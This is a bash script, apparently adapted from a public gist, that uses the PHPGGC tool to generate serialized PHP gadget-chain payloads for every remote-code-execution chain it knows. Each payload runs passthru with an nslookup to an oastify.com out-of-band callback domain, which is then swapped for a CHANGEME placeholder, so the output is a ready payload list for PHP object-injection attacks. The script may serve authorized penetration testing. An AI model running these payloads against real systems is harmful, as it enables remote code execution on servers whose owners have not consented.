#!/bin/bash

# based on https://gist.github.com/honoki/029425e61e829a9344558c8587c29f0f#file-phpggc-generate-payloads-sh
function="passthru"
command="nslookup poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com"
options="-s"
~/phpggc/phpggc -l | /bin/grep RCE | cut -d' ' -f1 | xargs -L 1 ~/phpggc/phpggc -i | /bin/grep 'phpggc ' --line-buffered |
while read line;  do
   gadget=$(echo $line | cut -d' ' -f2) &&
   if echo $line | /bin/grep -q "<function> <parameter>"; then
      echo -e "\n"
      echo $gadget "<function> <parameter>"
      ~/phpggc/phpggc $options $gadget "$function" "$command" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
   elif echo $line | /bin/grep -q "<code>"; then
      echo -e "\n"
      echo $gadget "<code>"
      ~/phpggc/phpggc $options $gadget "$function('$command');" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
   elif echo $line | /bin/grep -q "<command>"; then
      echo -e "\n"
      echo $gadget "<command>"
      ~/phpggc/phpggc $options $gadget "$command?$(date +%s)" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
   else
      echo -e "\n"
      echo $gadget
      ~/phpggc/phpggc $options $gadget | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
   fi;
done
